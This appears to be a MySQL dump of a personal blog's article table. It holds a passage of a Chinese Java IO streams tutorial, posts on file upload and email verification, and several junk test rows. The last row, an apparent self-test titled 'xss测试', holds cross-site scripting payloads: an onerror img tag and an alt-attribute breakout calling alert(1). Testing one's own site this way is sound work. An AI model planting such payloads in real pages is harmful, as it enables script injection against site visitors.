字符输出流Writer\n\n特点：\n\n* 输入流：默认一次读一个字节（和字节输入流一样），但遇到中文时，一次读多个字节\n* 输出流：底层会把数据按照指定的编码方式进行编码，变成字节再写到文件中\n\n应用场景：\n\n* 对于纯文本进行读写操作\n\n## 字符输入流——以FileReader为例\n\n### 基本使用\n\n1. 创建字符输入流对象\n2. 读取数据\n3. 释放资源\n\n代码示例：\n\n``` java\n// 创建FileReader对象,如果文件不存在会抛出FileNotFoundException异常\nFileReader fr = new FileReader(\"newDir/newFile.txt\");\nint ch;\nwhile ((ch = fr.read()) != -1){ // 读取一个字符，返回int类型\n    System.out.print((char)ch);\n}\nfr.close(); // 关闭流\n```\n\n### 空参read()和有参read的区别\n\n* 空参：读取字节数据后进行解码并转成十进制返回int类型，需手动进行强转为字符\n* 有参：读取数据+解码+强转并存入字符数组中，无需手动强转\n\n## 字符输出流——以FileWriter为例\n\n### 基本使用\n\n1. 创建字符输出流对象\n2. 写数据\n3. 释放资源\n\n### FileWriter构造方法\n\n| 构造方法                                           | 说明                            |\n| -------------------------------------------------- | ------------------------------- |\n| public FileWriter(File file)                       | 创建字符输出流关联本地文件      |\n| public FileWriter(String pathname)                 | 创建字符输出流关联本地文件      |\n| public FileWriter(File file,boolean append)        | 创建字符输出流关联本地文件,续写 |\n| public FileWriter(String pathname,,boolean append) | 创建字符输出流关联本地文件,续写 |\n\n### FileWriter成员方法\n\n| 成员方法                                   | 说明                   |\n| ------------------------------------------ | ---------------------- |\n| void write(int c)                          | 写出一个字符           |\n| void write(String str)                     | 写出一个字符串         |\n| void write(String str, int off , int len)  | 写出一个字符串的一部分 |\n| void write(char[] cbuf)                    | 写出一个字符数组       |\n| void write(char[] cbuf, int off , int len) | 写出字符数组的一部分   |\n\n# 缓冲流\n\n以上的FilexxxStream均为实现了四个抽象类的基本流，IO流中还有大量继承了基本流的高级流子类，缓冲流为其中一个子类\n\n## 字节缓冲流\n\n### 基本使用\n\n基本使用为通过构造方法创建缓冲流，但缓冲流需要关联基本流，缓冲流不能直接操作文件，实际工作的仍为基本流\n\n构造方法示例：\n\n``` java\n// 创建流对象, 构造方法中传递输入流和输出流\nBufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"newDir/小黄人.png\"));\nBufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"newDir/小黄人copy.png\"));\n```\n\n实际使用与基本流基本一致，释放资源时缓冲流会自动关闭关联的基本流\n\n``` java\n// 读写数据\nint b;\nwhile ((b = bis.read()) != -1) {\n    bos.write(b);\n}\n\n// 释放资源\nbos.close();\nbis.close();\n```\n\n## 字符缓冲流\n\n与字节缓冲流基本一致，但有两个特殊的方法\n\n### 字符输入流特有方法\n\n| 方法名                   | 说明                                       |\n| ------------------------ | ------------------------------------------ |\n| public String readLine() | 读取一行数据，如果没有数据读了，会返回null |\n\nreadLine()每次读取一行，但不会读取换行符\n\n### 字符输出流特有方法\n\n| 方法名                | 说明         |\n| --------------------- | ------------ |\n| public void newLine() | 跨平台的换行 |\n\n### 使用示例\n\n``` java\nBufferedReader br = new BufferedReader(new FileReader(\"newDir/newFile.txt\"));\nBufferedWriter bw = new BufferedWriter(new FileWriter(\"newDir/mewFile_copy.txt\"));\nString line;\nwhile ((line = br.readLine()) != null) {\n    bw.write(line);\n    bw.newLine();\n}\nbw.flush();\nbw.close();\n```\n\n# 序列化流和反序列化流\n\n序列化流——ObjectOutputStream，将java对象写出\n\n反序列化流——ObjectInputStream，读取序列化数据对象\n\n## 序列化流\n\n将java对象写出到数据中（乱码）\n\n使用示例：\n\n``` java\nObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"newDir/newFile.txt\"));\nobjectOutputStream.writeObject(new TestBean(\"张三\", 18));\nobjectOutputStream.close();\n```\n\n序列化输出的java bean类必须实现Serializable接口\n\n可序列化的java bean需要版本号` private static final long serialVersionUID = 版本号`\n\ntransient瞬态关键字：使用了transient的变量不会被序列化\n\n## 反序列化流\n\n将序列化数据读取到内存中\n\n使用示例：\n\n``` java\nObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"newDir/newFile.txt\"));\nTestBean bean = (TestBean) objectInputStream.readObject();\nSystem.out.println(bean.getName() + \" \" + bean.getAge());\n```\n\n# 打印流\n\n* 只可写不可读\n* 特有的写出方法可以实现数据的原样写出，例如写出97，文件中也是97（基本流会写出对应ASCII编码的字符）\n* 特有的写出方法可以实现自动刷新，自动换行\n\n## 字节打印流PrintStream\n\n构造方法：\n\n| 构造方法                                                     | 说明                         |\n| ------------------------------------------------------------ | ---------------------------- |\n| public PrintStream(OutputStream/File/String)                 | 关联字节输出流/文件/文件路径 |\n| public PrintStream(String fileName, Charset charset)         | 指定字符编码                 |\n| public PrintStream(OutputStream out, boolean autoFlush)      | 自动刷新                     |\n| public PrintStream(OutputStream out, boolean autoFlush, String encoding) | 指定字符编码且自动刷新       |\n\n字节流无缓存区，开不开自动刷新都一样\n\n成员方法：\n\n| 成员方法                                          | 说明                                       |\n| ------------------------------------------------- | ------------------------------------------ |\n| public void write(int b)                          | 常规方法：规则跟之前一样，将指定的字节写出 |\n| public void println(Xxx xx)                       | 特有方法：打印任意数据，自动刷新，自动换行 |\n| public void print(Xxx xx)                         | 特有方法：打印任意数据，不换行             |\n| public void printf(String format, Object... args) | 特有方法：带有占位符的打印语句，不换行     |\n\n## 字符打印流PrintWriter\n\n与字节打印流基本无异\n\n# 压缩流\n\n略\n\n# COMMONS-IO工具包\n\n略\n\n\n\n', '<h1 id=\"io流\">IO流</h1>\n<p>存储和读取数据的解决方案</p>\n<p>InputStream,OutputStream,Reader,Writer是所有输入输出流的父类</p>\n<h2 id=\"io流的分类\">IO流的分类</h2>\n<p>按流向可分为输入流和输出流，按操作文件的类型可分为字节流和字符流</p>\n<h1 id=\"字节流\">字节流</h1>\n<ol>\n  <li>字节输入流InputStream</li>\n  <li>字节输出流OutputStream</li>\n</ol>\n<h2 id=\"字节输出流的使用以fileoutputstream为例\">字节输出流的使用——以FileOutputStream为例</h2>\n<h3 id=\"基本使用\">基本使用</h3>\n<p>FileOutputStream为OutPutStream的一个子类，用于操作本地文件的输出流，可以把程序中的数据写出到本地文件中</p>\n<p>书写步骤：</p>\n<ol>\n  <li>创建字节输出流对象</li>\n  <li>写数据</li>\n  <li>释放资源</li>\n</ol>\n<p>代码示例</p>\n<pre><code class=\"language-java\">String FileName = &quot;文件路径&quot;\nFile file = new File(fileName);\nString readyToOutput = &quot;通过FileOutputStream输出&quot;;\ntry {\n    FileOutputStream fileOutputStream = new FileOutputStream(file); //创建字节输出流对象（相当于打开文件）\n    //此处使用File对象作为参数，也可直接使用文件路径作为参数\n    fileOutputStream.write(readyToOutput.getBytes()); //写入数据（字节输出流不能直接写入字符流数据，需要先进行转换）\n    fileOutputStream.close(); //释放资源（断开连接，相当于关闭文件）\n} catch (IOException e) {\n    System.out.println(e.getMessage());\n}\n</code></pre>\n<p>若文件不存在，会创建文件，若文件已存在，会覆盖文件内容</p>\n<h3 id=\"字节输出流写出数据的三种方式\">字节输出流写出数据的三种方式</h3>\n<table>\n  <thead>\n    <tr><th>方法名称</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>void write(int b)</td><td>一次写出一个字节数据</td></tr>\n    <tr><td>void write(byte[] b)</td><td>一次写一个字节数组数据</td></tr>\n    <tr><td>void write(byte[] b, int off, int len)</td><td>一次写一个字节数组的部分数据</td></tr>\n  </tbody>\n</table>\n<p>void write(byte[] b, int off, int len)中三个参数说明</p>\n<ul>\n  <li>b : 数组</li>\n  <li>off : 起始索引</li>\n  <li>len : 个数</li>\n</ul>\n<p>例如</p>\n<pre><code class=\"language-java\">try {\n    FileOutputStream fos = new FileOutputStream(&quot;newDir/newFile.txt&quot;);\n    byte[] b = &quot;abcde&quot;.getBytes();\n    fos.write(b, 1, 2);\n    fos.close();\n} catch (IOException e) {\n    System.out.println(e.getMessage());\n}\n</code></pre>\n<p>最终newFile.txt中内容为&quot;bc&quot;</p>\n<h3 id=\"换行与续写\">换行与续写</h3>\n<ol>\n  <li>\n    <p>换行：通过“\\r\\n”（Windows）实现换行</p>\n    <p>代码实现：</p>\n    <pre><code class=\"language-java\">byte[] b = &quot;abcde&quot;.getBytes();\nbyte[] b1 = &quot;fghij&quot;.getBytes();\nbyte[] wrap = &quot;\\r\\n&quot;.getBytes();\nfos.write(b);\nfos.write(wrap);\nfos.write(b1);\n</code></pre>\n  </li>\n  <li>\n    <p>续写：在new FileOutputStream()创建字节输出流对象时将第二个参数(append)设为true（默认为false）</p>\n  </li>\n</ol>\n<h2 id=\"字节输入流的使用以fileinputstream为例\">字节输入流的使用——以FileInputStream为例</h2>\n<h3 id=\"基本使用-1\">基本使用</h3>\n<p>书写步骤：</p>\n<ol>\n  <li>创建字节输入流对象</li>\n  <li>读数据</li>\n  <li>释放资源</li>\n</ol>\n<p>使用基本与输出流一致，写数据即使用read()替换write()方法</p>\n<p>int read()方法说明：</p>\n<ul>\n  <li>该方法会一个<strong>字节</strong>一个<strong>字节</strong>地依次读取文件中的数据</li>\n  <li>当读到文件的末尾时，返回数据为-1</li>\n</ul>\n<h3 id=\"输入流的一些细节\">输入流的一些细节</h3>\n<ol>\n  <li>输出流若文件不存在会自动创建，而输入流会直接报错</li>\n  <li>读出来的数据是ASCII对应的数字</li>\n  <li>每次使用完必须close()释放资源（防止资源占用导致其他程序无法使用）</li>\n</ol>\n<h3 id=\"循环读取到文件末尾\">循环读取到文件末尾</h3>\n<p>代码示例：</p>\n<pre><code class=\"language-java\">try {\n    FileInputStream fis = new FileInputStream(&quot;newDir/newFile.txt&quot;);\n    int b = 0;\n    while ((b = fis.read()) != -1){\n        System.out.print((char)b);\n    }\n    System.out.println();\n    fis.close();\n}catch (IOException e){\n    System.out.println(e.getMessage());\n}\n</code></pre>\n<h2 id=\"通过输入输出流实现文件拷贝\">通过输入输出流实现文件拷贝</h2>\n<p>代码示例：</p>\n<pre><code class=\"language-java\">try {\n    FileInputStream fis = new FileInputStream(&quot;待拷贝文件路径&quot;);\n    FileOutputStream fos = new FileOutputStream(&quot;目标文件路劲&quot;);\n    int b = 0;\n    while ((b = fis.read()) != -1) {\n        fos.write(b);\n    }\n    fis.close();\n    fos.close();\n} catch (Exception e) {\n    System.out.println(e.getMessage());\n}\n</code></pre>\n<p>弊端：一次拷贝一个字节速度过慢</p>\n<p>解决方法：一次拷贝多个字节</p>\n<table>\n  <thead>\n    <tr><th>方法</th><th>描述</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public int read()</td><td>一次读取一个字节数据</td></tr>\n    <tr><td>public int read(byte buffer)</td><td>一次读取一个字节数组数据，每次读取会尽可能把数组装满</td></tr>\n  </tbody>\n</table>\n<p>解决代码示例</p>\n<pre><code class=\"language-java\"> try {\n    FileInputStream fis = new FileInputStream(&quot;newDir/test.mp4&quot;);\n    FileOutputStream fos = new FileOutputStream(&quot;newDir/output.mp4&quot;);\n\n    // 拷贝开始时间\n    long start = System.currentTimeMillis();\n    byte[] bytes = new byte[1024*1024*5];//每次拷贝5Mb的数据块\n    int len;\n    int already = 0;\n    while ((len = fis.read(bytes)) != -1) {\n        fos.write(bytes, 0, len);\n        already += len;\n        System.out.println(&quot;已拷贝：&quot; + already/1024/1024 + &quot;MB&quot;);\n    }\n    // 拷贝结束时间\n    long end = System.currentTimeMillis();\n    System.out.println(&quot;拷贝完成，耗时：&quot; + (end - start) + &quot;ms&quot;);\n\n    fos.close();\n    fis.close();\n} catch (Exception e) {\n    System.out.println(e.getMessage());\n}\n</code></pre>\n<p>最简单的拷贝方法：</p>\n<pre><code class=\"language-java\">fis.transferTo(fos);\n</code></pre>\n<h1 id=\"字符流\">字符流</h1>\n<h2 id=\"基础介绍\">基础介绍</h2>\n<p>字符流=字节流+字符集</p>\n<p>分类：</p>\n<ol>\n  <li>字符输入流Reader</li>\n  <li>字符输出流Writer</li>\n</ol>\n<p>特点：</p>\n<ul>\n  <li>输入流：默认一次读一个字节（和字节输入流一样），但遇到中文时，一次读多个字节</li>\n  <li>输出流：底层会把数据按照指定的编码方式进行编码，变成字节再写到文件中</li>\n</ul>\n<p>应用场景：</p>\n<ul>\n  <li>对于纯文本进行读写操作</li>\n</ul>\n<h2 id=\"字符输入流以filereader为例\">字符输入流——以FileReader为例</h2>\n<h3 id=\"基本使用-2\">基本使用</h3>\n<ol>\n  <li>创建字符输入流对象</li>\n  <li>读取数据</li>\n  <li>释放资源</li>\n</ol>\n<p>代码示例：</p>\n<pre><code class=\"language-java\">// 创建FileReader对象,如果文件不存在会抛出FileNotFoundException异常\nFileReader fr = new FileReader(&quot;newDir/newFile.txt&quot;);\nint ch;\nwhile ((ch = fr.read()) != -1){ // 读取一个字符，返回int类型\n    System.out.print((char)ch);\n}\nfr.close(); // 关闭流\n</code></pre>\n<h3 id=\"空参read和有参read的区别\">空参read()和有参read的区别</h3>\n<ul>\n  <li>空参：读取字节数据后进行解码并转成十进制返回int类型，需手动进行强转为字符</li>\n  <li>有参：读取数据+解码+强转并存入字符数组中，无需手动强转</li>\n</ul>\n<h2 id=\"字符输出流以filewriter为例\">字符输出流——以FileWriter为例</h2>\n<h3 id=\"基本使用-3\">基本使用</h3>\n<ol>\n  <li>创建字符输出流对象</li>\n  <li>写数据</li>\n  <li>释放资源</li>\n</ol>\n<h3 id=\"filewriter构造方法\">FileWriter构造方法</h3>\n<table>\n  <thead>\n    <tr><th>构造方法</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public FileWriter(File file)</td><td>创建字符输出流关联本地文件</td></tr>\n    <tr><td>public FileWriter(String pathname)</td><td>创建字符输出流关联本地文件</td></tr>\n    <tr><td>public FileWriter(File file,boolean append)</td><td>创建字符输出流关联本地文件,续写</td></tr>\n    <tr><td>public FileWriter(String pathname,,boolean append)</td><td>创建字符输出流关联本地文件,续写</td></tr>\n  </tbody>\n</table>\n<h3 id=\"filewriter成员方法\">FileWriter成员方法</h3>\n<table>\n  <thead>\n    <tr><th>成员方法</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>void write(int c)</td><td>写出一个字符</td></tr>\n    <tr><td>void write(String str)</td><td>写出一个字符串</td></tr>\n    <tr><td>void write(String str, int off , int len)</td><td>写出一个字符串的一部分</td></tr>\n    <tr><td>void write(char[] cbuf)</td><td>写出一个字符数组</td></tr>\n    <tr><td>void write(char[] cbuf, int off , int len)</td><td>写出字符数组的一部分</td></tr>\n  </tbody>\n</table>\n<h1 id=\"缓冲流\">缓冲流</h1>\n<p>以上的FilexxxStream均为实现了四个抽象类的基本流，IO流中还有大量继承了基本流的高级流子类，缓冲流为其中一个子类</p>\n<h2 id=\"字节缓冲流\">字节缓冲流</h2>\n<h3 id=\"基本使用-4\">基本使用</h3>\n<p>基本使用为通过构造方法创建缓冲流，但缓冲流需要关联基本流，缓冲流不能直接操作文件，实际工作的仍为基本流</p>\n<p>构造方法示例：</p>\n<pre><code class=\"language-java\">// 创建流对象, 构造方法中传递输入流和输出流\nBufferedInputStream bis = new BufferedInputStream(new FileInputStream(&quot;newDir/小黄人.png&quot;));\nBufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(&quot;newDir/小黄人copy.png&quot;));\n</code></pre>\n<p>实际使用与基本流基本一致，释放资源时缓冲流会自动关闭关联的基本流</p>\n<pre><code class=\"language-java\">// 读写数据\nint b;\nwhile ((b = bis.read()) != -1) {\n    bos.write(b);\n}\n\n// 释放资源\nbos.close();\nbis.close();\n</code></pre>\n<h2 id=\"字符缓冲流\">字符缓冲流</h2>\n<p>与字节缓冲流基本一致，但有两个特殊的方法</p>\n<h3 id=\"字符输入流特有方法\">字符输入流特有方法</h3>\n<table>\n  <thead>\n    <tr><th>方法名</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public String readLine()</td><td>读取一行数据，如果没有数据读了，会返回null</td></tr>\n  </tbody>\n</table>\n<p>readLine()每次读取一行，但不会读取换行符</p>\n<h3 id=\"字符输出流特有方法\">字符输出流特有方法</h3>\n<table>\n  <thead>\n    <tr><th>方法名</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public void newLine()</td><td>跨平台的换行</td></tr>\n  </tbody>\n</table>\n<h3 id=\"使用示例\">使用示例</h3>\n<pre><code class=\"language-java\">BufferedReader br = new BufferedReader(new FileReader(&quot;newDir/newFile.txt&quot;));\nBufferedWriter bw = new BufferedWriter(new FileWriter(&quot;newDir/mewFile_copy.txt&quot;));\nString line;\nwhile ((line = br.readLine()) != null) {\n    bw.write(line);\n    bw.newLine();\n}\nbw.flush();\nbw.close();\n</code></pre>\n<h1 id=\"序列化流和反序列化流\">序列化流和反序列化流</h1>\n<p>序列化流——ObjectOutputStream，将java对象写出</p>\n<p>反序列化流——ObjectInputStream，读取序列化数据对象</p>\n<h2 id=\"序列化流\">序列化流</h2>\n<p>将java对象写出到数据中（乱码）</p>\n<p>使用示例：</p>\n<pre><code class=\"language-java\">ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;newDir/newFile.txt&quot;));\nobjectOutputStream.writeObject(new TestBean(&quot;张三&quot;, 18));\nobjectOutputStream.close();\n</code></pre>\n<p>序列化输出的java bean类必须实现Serializable接口</p>\n<p>可序列化的java bean需要版本号<code>private static final long serialVersionUID = 版本号</code></p>\n<p>transient瞬态关键字：使用了transient的变量不会被序列化</p>\n<h2 id=\"反序列化流\">反序列化流</h2>\n<p>将序列化数据读取到内存中</p>\n<p>使用示例：</p>\n<pre><code class=\"language-java\">ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;newDir/newFile.txt&quot;));\nTestBean bean = (TestBean) objectInputStream.readObject();\nSystem.out.println(bean.getName() + &quot; &quot; + bean.getAge());\n</code></pre>\n<h1 id=\"打印流\">打印流</h1>\n<ul>\n  <li>只可写不可读</li>\n  <li>特有的写出方法可以实现数据的原样写出，例如写出97，文件中也是97（基本流会写出对应ASCII编码的字符）</li>\n  <li>特有的写出方法可以实现自动刷新，自动换行</li>\n</ul>\n<h2 id=\"字节打印流printstream\">字节打印流PrintStream</h2>\n<p>构造方法：</p>\n<table>\n  <thead>\n    <tr><th>构造方法</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public PrintStream(OutputStream/File/String)</td><td>关联字节输出流/文件/文件路径</td></tr>\n    <tr><td>public PrintStream(String fileName, Charset charset)</td><td>指定字符编码</td></tr>\n    <tr><td>public PrintStream(OutputStream out, boolean autoFlush)</td><td>自动刷新</td></tr>\n    <tr><td>public PrintStream(OutputStream out, boolean autoFlush, String encoding)</td><td>指定字符编码且自动刷新</td></tr>\n  </tbody>\n</table>\n<p>字节流无缓存区，开不开自动刷新都一样</p>\n<p>成员方法：</p>\n<table>\n  <thead>\n    <tr><th>成员方法</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>public void write(int b)</td><td>常规方法：规则跟之前一样，将指定的字节写出</td></tr>\n    <tr><td>public void println(Xxx xx)</td><td>特有方法：打印任意数据，自动刷新，自动换行</td></tr>\n    <tr><td>public void print(Xxx xx)</td><td>特有方法：打印任意数据，不换行</td></tr>\n    <tr><td>public void printf(String format, Object... args)</td><td>特有方法：带有占位符的打印语句，不换行</td></tr>\n  </tbody>\n</table>\n<h2 id=\"字符打印流printwriter\">字符打印流PrintWriter</h2>\n<p>与字节打印流基本无异</p>\n<h1 id=\"压缩流\">压缩流</h1>\n<p>略</p>\n<h1 id=\"commons-io工具包\">COMMONS-IO工具包</h1>\n<p>略</p>\n', 'https://oss.lilicould.cn/cover/82952c97-a0b8-420c-9e99-72be8f452e94_后端代码.png', 1, 33, 3, '2026-04-02 20:52:20', '2026-05-19 09:37:09', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (57, '更新文件上传功能', 'update-file-upload', '修复文件上传功能，现在可以正常使用文件上传功能，以此完善了封面上传，头像更新以及写博客时上传自己的图片。', '# 文件上传功能\n## 更换头像\n![](https://lilicould.cn:8888/uploads/6b3639fc-54fe-4814-b7e9-c9f53fd0a51c.png)\n进入个人信息页面点击图片指示的按钮即会弹出更新界面，上传后即可实现头像更新。\n## 封面上传功能\n![](https://lilicould.cn:8888/uploads/0beee4a9-32a8-46c0-89bd-ef02727a1c5c.png)\n废除输入URL的方式改为直接上传图片，\n## 博客中图片\n![](https://lilicould.cn:8888/uploads/d2cd8ef3-718b-4ab9-b49d-1a581eed636e.png)\n现在可以通过这个按钮上传图片，如果剪切板中有通过截图软件截图的记录，也可直接ctrl+v键入图片。\n', '<h1 id=\"文件上传功能\">文件上传功能</h1>\n<h2 id=\"更换头像\">更换头像</h2>\n<p><img src=\"https://lilicould.cn:8888/uploads/6b3639fc-54fe-4814-b7e9-c9f53fd0a51c.png\" alt=\"\" /><br>\n进入个人信息页面点击图片指示的按钮即会弹出更新界面，上传后即可实现头像更新。</p>\n<h2 id=\"封面上传功能\">封面上传功能</h2>\n<p><img src=\"https://lilicould.cn:8888/uploads/0beee4a9-32a8-46c0-89bd-ef02727a1c5c.png\" alt=\"\" /><br>\n废除输入URL的方式改为直接上传图片，</p>\n<h2 id=\"博客中图片\">博客中图片</h2>\n<p><img src=\"https://lilicould.cn:8888/uploads/d2cd8ef3-718b-4ab9-b49d-1a581eed636e.png\" alt=\"\" /><br>\n现在可以通过这个按钮上传图片，如果剪切板中有通过截图软件截图的记录，也可直接ctrl+v键入图片。</p>\n', 'https://oss.lilicould.cn/cover/02599e53-6319-43c2-b9ad-a481c136984b_大和jpg.jpg', 1, 32, 3, '2026-04-03 12:38:50', '2026-05-19 09:35:14', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (58, '123123123', '123123333', '123', '2', '<p>2</p>\n', NULL, 2, 4, 2, '2026-04-03 21:53:50', '2026-05-19 09:35:58', 2, 2, 1);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (59, '3333333333333333', '1222', '123123', '### 213', '<h3 data-line=\"0\" id=\"213\">213</h3>\n', 'https://lilicould.cn:8888/uploads/d38c11fb-e208-4d6e-852c-d2f834dc0143.jpg', 1, 3, 2, '2026-04-03 22:15:36', '2026-05-19 10:18:58', 2, 2, 1);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (60, '测试', 'tttttttttest', 'hrllo', '![](https://lilicould.cn:8888/uploads/56f96b65-f342-47dd-b643-0f4a940893c0.jpg)\nxxx', '<p data-line=\"0\"><img src=\"https://lilicould.cn:8888/uploads/56f96b65-f342-47dd-b643-0f4a940893c0.jpg\" alt=\"\"><br>\nxxx</p>\n', NULL, 1, 4, 2, '2026-04-03 22:25:54', '2026-05-19 09:33:09', 2, NULL, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (61, '777', 'zzz', 'zss', '7', '<p data-line=\"0\">7</p>\n', 'https://lilicould.cn:8888/uploads/87220cd4-9e71-405d-b89a-67044d5353d2.jpg', 1, 1, 2, '2026-04-03 22:29:18', '2026-05-19 09:33:24', 2, 2, 1);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (63, '更新邮箱认证功能', 'update-email-auth', '注册时邮箱必须认证才可以通过验证。', '# 注册时邮箱认证\n## 简要描述\n之前注册时候没有任何的认证，意味着随便输一个邮箱，不论这个邮箱是否有效或者是否为本人的，都可以成功注册账号。\n这样就有一个隐患，通过脚本很容易就能实现以超高频率注册大量账号或者使用别人的邮箱。\n而且只有实现了邮箱认证功能才能继续去实现`忘记密码`功能。\n## 实现原理\n实现原理很简单，spring提供了很便捷的邮箱工具，配置好自己的信息之后直接使用就可以发送。\n既然可以发邮件了，只需要用户发送请求过来然后生成验证码，发送到用户填的邮箱上，然后用户再填写收到的验证码认证就可以了。\n但是这是两次请求，所以服务器必须要存储验证码以做比对，这里就需要用`redis`了。\n当然别的存储方式也是可以的，不过`redis`可以说是十分方便。\n## 具体实现\n用户先发请求获取验证码，这时候服务器生成6位随机验证码，并以用户发送过来的email邮箱地址为key存到redis中，再发邮件给这个emai，用户收到后填写验证码再发请求到注册接口，比对后正确再进行后续的注册服务。\n## 一些问题\n一开始存redis的时候一个6位验证码前面竟然有一大堆乱码方格，而且一个验证码竟然占用了270多kb的内存，redis本身是基于内存的，这样的消耗服务器可吃不起。\n最初以为是序列化的问题，但是不管怎么配置都没用，AI也是找不出问题。\n最后还是以经验为重，终于在网上查到遇到相同问题的帖子了，结果是一个很简单的小错误。\n因为spring-redis提供的存储方法如果传入三个参数的话，第三个参数是偏移量，而我以为是时间，导致传入5分钟也就是5x60x1000的偏移量，那些小方格就是这个偏移的空值。需要传入四个参数，即第四个参数`单位`\n## 一个笑话\n在测试注册过去邮箱验证码的时候，出现了一个有意思的事情。获取验证码这个请求需要token验证，也就是说要先登录才能注册。假设这是一个新用户，那为了登录需要注册账号，但是要想注册就必须要登录，然后就陷入了死循环。这显然是不合理的。后面在拦截器把这个接口加入白名单就好了。\n', '<h1 id=\"注册时邮箱认证\">注册时邮箱认证</h1>\n<h2 id=\"简要描述\">简要描述</h2>\n<p>之前注册时候没有任何的认证，意味着随便输一个邮箱，不论这个邮箱是否有效或者是否为本人的，都可以成功注册账号。<br>\n这样就有一个隐患，通过脚本很容易就能实现以超高频率注册大量账号或者使用别人的邮箱。<br>\n而且只有实现了邮箱认证功能才能继续去实现<code>忘记密码</code>功能。</p>\n<h2 id=\"实现原理\">实现原理</h2>\n<p>实现原理很简单，spring提供了很便捷的邮箱工具，配置好自己的信息之后直接使用就可以发送。<br>\n既然可以发邮件了，只需要用户发送请求过来然后生成验证码，发送到用户填的邮箱上，然后用户再填写收到的验证码认证就可以了。<br>\n但是这是两次请求，所以服务器必须要存储验证码以做比对，这里就需要用<code>redis</code>了。<br>\n当然别的存储方式也是可以的，不过<code>redis</code>可以说是十分方便。</p>\n<h2 id=\"具体实现\">具体实现</h2>\n<p>用户先发请求获取验证码，这时候服务器生成6位随机验证码，并以用户发送过来的email邮箱地址为key存到redis中，再发邮件给这个emai，用户收到后填写验证码再发请求到注册接口，比对后正确再进行后续的注册服务。</p>\n<h2 id=\"一些问题\">一些问题</h2>\n<p>一开始存redis的时候一个6位验证码前面竟然有一大堆乱码方格，而且一个验证码竟然占用了270多kb的内存，redis本身是基于内存的，这样的消耗服务器可吃不起。<br>\n最初以为是序列化的问题，但是不管怎么配置都没用，AI也是找不出问题。<br>\n最后还是以经验为重，终于在网上查到遇到相同问题的帖子了，结果是一个很简单的小错误。<br>\n因为spring-redis提供的存储方法如果传入三个参数的话，第三个参数是偏移量，而我以为是时间，导致传入5分钟也就是5x60x1000的偏移量，那些小方格就是这个偏移的空值。需要传入四个参数，即第四个参数<code>单位</code></p>\n<h2 id=\"一个笑话\">一个笑话</h2>\n<p>在测试注册过去邮箱验证码的时候，出现了一个有意思的事情。获取验证码这个请求需要token验证，也就是说要先登录才能注册。假设这是一个新用户，那为了登录需要注册账号，但是要想注册就必须要登录，然后就陷入了死循环。这显然是不合理的。后面在拦截器把这个接口加入白名单就好了。</p>\n', 'https://lilicould.cn:8888/uploads/a081c1b5-552d-4157-955e-1cd00b1de6b8.png', 1, 42, 2, '2026-04-03 22:57:37', '2026-05-19 10:19:11', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (64, 'xss测试', 'xss-test', '点进这篇文章，背景应该会被替换\n', '\n&lt;img src=x onerror=\"document.body.style.background=\'#222\';document.body.style.color=\'red\'\"&gt;\n列表测试\n\n1. 有序列表1\n2. 有序列表2\n- 无序列表1\n- 无序列表2\n![aaaa\" onerror=\"alert(1)\" x=\"](xxx)', '<p>&lt;img src=x onerror=&quot;document.body.style.background=\'#222\';document.body.style.color=\'red\'&quot;&gt;<br>\n列表测试</p>\n<ol>\n  <li>有序列表1</li>\n  <li>有序列表2</li>\n</ol>\n<ul>\n  <li>无序列表1</li>\n  <li>无序列表2<br>\n    <img src=\"xxx\" alt=\"aaaa&quot; onerror=&quot;alert(1)&quot; x=&quot;\" /></li>\n</ul>\n', 'https://lilicould.cn:8888/uploads/ddd7f256-5eb2-4788-a2dc-d950ddb1080d.png', 2, 54, 2, '2026-04-04 18:27:38', '2026-05-19 10:20:12', 2, 2, 0);
